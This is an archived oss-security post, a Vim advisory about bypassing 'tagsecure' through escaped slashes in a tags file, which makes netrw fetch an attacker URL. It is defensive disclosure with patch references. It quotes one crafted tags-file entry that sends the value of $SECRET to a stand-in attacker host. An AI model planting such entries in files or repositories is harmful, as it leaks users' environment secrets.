X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/11/15/3
Message-ID: <avnOlkWVZSWoEDrg@256bit.org>
Date: Sun, 15 Nov 2026 16:24:06 +0100
From: Christian Brabandt <cb@...bit.org>
To: oss-security@...ts.openwall.com
Subject: [vim-security] 'tagsecure' Bypass via Escaped URL in Tags File in Vim  < 9.2.1352
Content-Type: text/plain; charset=utf-8

'tagsecure' Bypass via Escaped URL in Tags File in Vim  < 9.2.1352
==================================================================

Date: 15.11.2026
Severity: Low
CVE: *requested, not yet assigned*
CWE: Incomplete List of Disallowed Inputs (CWE-184)

## Summary

Patch 9.2.0405 made Vim refuse a file name in a tags file that is a URL;
patch 9.2.0497 made this configurable with the 'tagsecure' option.  The check
is done before the file name is expanded.  A file name with escaped slashes
like `http:\/\/` therefore passes the check and is then opened as a URL by
the netrw plugin.

## Description

When jumping to a tag, `expand_tag_fname()` rejects the file field of the
tag entry if it is a URL and 'tagsecure' is set.  Afterwards, a file field
containing wildcards or environment variables is expanded, which removes
backslashes and expands `$VAR`.  A file field like:

    http:\/\/attacker.example/$SECRET/x*

is not recognized as a URL, but expands to
`http://attacker.example/<value of $SECRET>/x*`, which netrw then fetches.

## Impact

A network request to an attacker-controlled host, which may contain the
values of environment variables.  Exploitation requires:

- Vim with the netrw plugin enabled
- the victim using a crafted tags file, e.g. from a cloned repository, and
  jumping to a tag from it.

The severity is rated Low because no command execution is possible and
leaking environment variables requires the attacker to guess their names.

## Acknowledgements

The Vim project would like to thank Zachariah Mithani for reporting the issue.

## References

The issue has been fixed as of Vim patch [v9.2.1352](https://github.com/vim/vim/releases/tag/v9.2.1352).

- [Commit](https://github.com/vim/vim/commit/8da4660cf4068e6812b4eacdf78c8b05c7774d9a)
- [Github Security Advisory](https://github.com/vim/vim/security/advisories/GHSA-j6wv-2276-36jq)

Best,
Christian
-- 
Mancher hat nach der Antike studiert und sich ihr Wesen nicht
ganz zugeeignet. Ist er darum scheltenswert?
		-- Goethe, Maximen und Reflektionen, Nr. 1145
